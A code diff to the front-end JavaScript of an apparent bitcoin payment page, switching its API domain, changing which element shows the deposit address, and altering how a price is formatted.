@@ -45,7 +45,7 @@ function loaderFunction(status) {
 async function send_request(type, laoder, url, data) {
     if (laoder) { loaderFunction(false) }
     return new Promise((resolve, reject) => {
-        let page = `https://cryptwells.com/api/${url}`;
+        let page = `https://hexocrypt.com/api/${url}`;
         xhr.open(type, page)
         xhr.responseType = "json"
         xhr.setRequestHeader("Accept", "application/json")
@@ -75,7 +75,8 @@ async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr
     document.getElementById("balance_euro").textContent = priceEuro + " EUR"
     document.getElementById("qr_code").src = qr.qr_code_link
     document.getElementById("get_commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
-    document.querySelector(".btc_address").textContent = address
+    // document.querySelector(".btc_address").textContent = address
+    document.querySelector(".btc_address-2").textContent = address
     document.querySelector("#get_balance").textContent = `${priceEuro} EUR = ${priceInBitcoin} BTC`
     document.querySelector("#bitcoin-address").textContent = address
     document.querySelector("#bitcoin-commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
@@ -173,7 +174,8 @@ async function start() {
     let setPriceBitcoinCommission = getPriceBitcoinCommission.price
     let getPriceInEuro = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
     let getPriceInEuroCommission = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoinCommission, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
-    setElements(sendPriceBitcoin, Number(setPriceBitcoin).toFixed(2), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address)
+    setElements(sendPriceBitcoin, Number(setPriceBitcoin), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address)
+    // setElements(sendPriceBitcoin, Number(setPriceBitcoin).toFixed(2), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address)
 }
 
 start()
